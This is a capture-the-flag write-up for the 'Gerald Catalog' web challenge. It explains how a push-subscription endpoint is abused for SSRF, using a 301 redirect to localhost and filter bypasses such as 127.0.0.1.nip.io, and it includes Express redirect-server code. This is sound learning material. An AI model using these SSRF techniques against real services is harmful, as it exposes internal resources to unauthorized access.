# Gerald Catalog
> 450 points, 6 solves, Author: anli
>
> Spotted a wild Gerald? Catalog them with the Official* Gerald Catalog!
> Use Firefox or a Chromium-based browser for the best experience!

The challenge is hosted at https://web.bcactf.com:49163/ and the source code of
the application was provided. This application has a registration & sign in flow,
an ability to create "geralds" which render an image with a custom caption on
view, and the ability to subscribe to push notifications when yours is viewed.

There is a specific gerald named "Flag Gerald" which has a copyright claim on it
which prevents anyone but on-side administrators to view it.

Our goal is to figure out how to get the caption of this gerald, which is where
the flag is stored (found in source).

## Quick Answer
1. Subscribe to push notifcations for "Flag Gerald"
1. Subscribe to push notifications for "Gerald", but modify the payload so
   the endpoint is your custom push server. You could use any other gerald here,
   it doesn't matter.
1. Add a breakpoint in sw.js when a push is received
1. View "Gerald"
1. Retrieve the caption/flag from the breakpoint 

## Full Explanation
This challenge took me quite awhile to figure out and I only finally solved it
with 1 hour left until the CTF was over after reading through the [Web Push
RFC](https://datatracker.ietf.org/doc/html/draft-ietf-webpush-protocol) for a bit.

There's a lot to look into with this app for how we might be able to view "Flag
Gerald" that took a lot of time to eliminate.

*Can we bypass the copyright claim logic in some way?* 
For example, IP forging with `X-Proto-For`, extra data stored in the JS Object
DB, prototype pollution

*Is there an XSS we can use to script a request?* 
Handlebars is used for templating, any unescaped html like `{{{html}}}`? Old
CVEs for HBS? What about DOM XSS? This code is in `gerald.hbs`, `<img
src="{{image}}" />`. The gerald image generation endpoint accepts an arbitrary
caption and renders it in a photo, any bugs in that? What about in the
underlying library used?

*Can we manipulate the DB data structures to get around the copyright claim?*
Does the app store any raw body payloads in the database? Are there any
filters we can bypass? Funny antectode, you can register as `__proto__` because
there is no username validation, and someone did by the time I tried to lol.

I don't want to write up details on why none of the above works, but suffice to
say it took me a lot of time to go through all of those until I finally
clarified how the problem was suppposed to be solved and focused on that. So
what was that clarity?

I realized that XSS wasn't going to be possible without something like an HBS
0-day which wasn't what this was going to be asking for, so I landed on needing
to find an SSRF and focused on that. In particular, we need a GET request SSRF.

### Finding a GET SSRF

If you look for external requests in the app you'll come across just
one in `notify.js`
```javascript
export async function sendNotifications(id: string, {subscription, name, caption}: Gerald) {
  if (subscription) {
    const {endpoint, headers, body, method} = await generateRequestDetails(subscription, JSON.stringify({ id, name, caption }));
    const response = await fetch(endpoint, {headers, body, method});
  }
}
```

If you dig into `generateRequestDetails`  you'll find out that this returns
data to make a POST to the subcription endpoint. An important aspect to notice
about this endpoint is that it sends the id, name and caption as part of the
push message, and the caption holds the flag. So if we can trigger the push, we
also need to intercept it somehow.

We can control the endpoint through the `PUT /geralds/:id/subscription` API
which is used to subscribe to notifications, you can replace the `endpoint`
value with your own server and see the `POST` SSRF come through. The request
looks like so:

```
PUT /gerald/2ae5dd3a-32e0-4f9b-8841-6c3c01433198/subscription HTTP/1.1
Host: web.bcactf.com:49163
Cookie: XXXXX
...snip...

{"endpoint":"https://your-push-server-here.com","keys":{"auth":"r8WKvrMGOloDmOMnkXtz8g","p256dh":"BCbfOkt9JjkSQNlgPvb1ogzENEl8m2JlbesORovA7iEkZjhzAeyUSc0ZLmpUrmvDuHAQvXxIVhpRoexZSYfwjLc"}}
```

> You may have noticed that in `notify.js` there's all sorts of validations around
> the value of the endpoint, but notably it allows external URLs just fine. These
> are incomplete anyways, you can bypass with 0.0.0.0 or with sites like 127.0.0.1.nip.io
> that resolve back to localhost. The incompleteness and how many checks there
> are actually makes you think there is a vuln here we can use, but not any I found.
>
> Also the keys and the fact that the request has encrypted content seem like they might
> be an issue, but you don't actually need to deal with this. Though that would be
> an interesting (and more complex) variant of this challenge, to actually implement
> the key exchange and algorithms for decoding the push message on your server.

But this is just a POST we need a GET so this won't actually work... or will it ;)

This is where you either need to be creative and just try stuff, or read the
spec. For me I was out of ideas so I started reading through the spec, knowing
that push was an important part of the challenge because for one it's rare to
see in CTFs and second, the challenge hint mentions it.

I started reviewing the spec by grepping for any GETs and reading the
information around them. My first aha moment was when reading section 5.1 about
"Requesting Push Message Receipts", basically the push server can request for it
to be made async and then will later make a GET to a push server controlled
value for confirmation in the `Link:` header. This seemed like a great way to
get an SSRF! 

```
HTTP/1.1 202 Accepted
Date: Thu, 11 Dec 2014 23:56:55 GMT
Link: </receipt-subscription/3ZtI4YVNBnUUZhuoChl6omUvG4ZM>;
        rel="urn:ietf:params:push:receipt"
Location: https://push.example.net/message/qDIYHNcfAIPP_5ITvURr-d6BGt
```

But it turns out this app do async push so that's not applicable, shortly after
I was saddened by this, I noticed what was staring me in the face. The
`Location:` header.

Section 5 is what maps to what the challenge app is doing in `notify.js` and per
the spec is supposed to return a `201 Created` with the location header set to
where to find the message. Aha!

```
HTTP/1.1 201 Created
Date: Thu, 11 Dec 2014 23:56:55 GMT
Location: https://push.example.net/message/qDIYHNcfAIPP_5ITvURr-d6BGt
```

Finally it clicked that `Location` is typically used for redirects, and that
will be a `GET` to a value that we can control. So I coded up the server, set
a 201 status and custom location to my server to test SSRF and... nothing.

In retrospect this was kind of a dumb expectation since it's just doing a
`fetch` and that's not going to follow that header with a `201`. But in the
moment I pretty quickly decided to change to a `301` and BOOM. My server
receives a GET request from the instance when I view "Gerald".

This is what the server response needs to look like (some headers could be
removed but express added them by default).
```
$ curl -v -XPOST localhost:8000
...snip...
< HTTP/1.1 301 Moved Permanently
< X-Powered-By: Express
< Location: http://your-ssrf-target.com
< Date: Sun, 13 Jun 2021 22:34:25 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Content-Length: 0
```

Now that I have a working SSRF, I just need to get the server to visit "Flag
Gerald" and I'll get my push notification about viewing it. I first set it to
"Also Gerald" (`https://web.bcactf.com:49163/gerald/f97d35b2-2c95-4889-a278-a6376337bd9c`)
just to check that it was working at all, and it was, I got a push about it!
Then I set it to "Flag Gerald" and... no push.

This was because when localhost makes a request to web.bcactf.com, it's not coming
directly from localhost anymore so the IP was set wrong and it wasn't allowing
it to be viewed, so no push. From the source code we can see where the app is
hosted internally:

```javascript
app.listen(1337);
console.log("Listening at http://localhost:1337");
```

So we change redirection to go to `https://localhost:1337/gerald/f97d35b2-2c95-4889-a278-a6376337bd9c`,
and BOOM. We get the push notification.

### Intercepting the Push Notification
We could be real fancy and try to implement a setup that could actually decrypt
the payload in the push message but there's a way easier way. In Firefox
devtools (and I'm sure Chrome too), you can start up the service worker and set
breakpoints in the javascript just like you can on normal websites, so we just
set one before it shows the notification and once we view "Gerald" again to
trigger the SSRF, bada bing we hit our breakpoint and get the flag.

![breakpoint]()

## Code used for server
```javascript
const express = require('express');
const morgan = require('morgan');

const app = express();
app.use(morgan('dev')); // nice logs when requests hit it

app.post('/', function(req, res){
  res.set('Location', 'http://localhost:1337/gerald/153d4759-fe68-48bc-a83b-283d03497b25';);
  res.status(301);
  return res.send();
});

app.listen(8000);
```
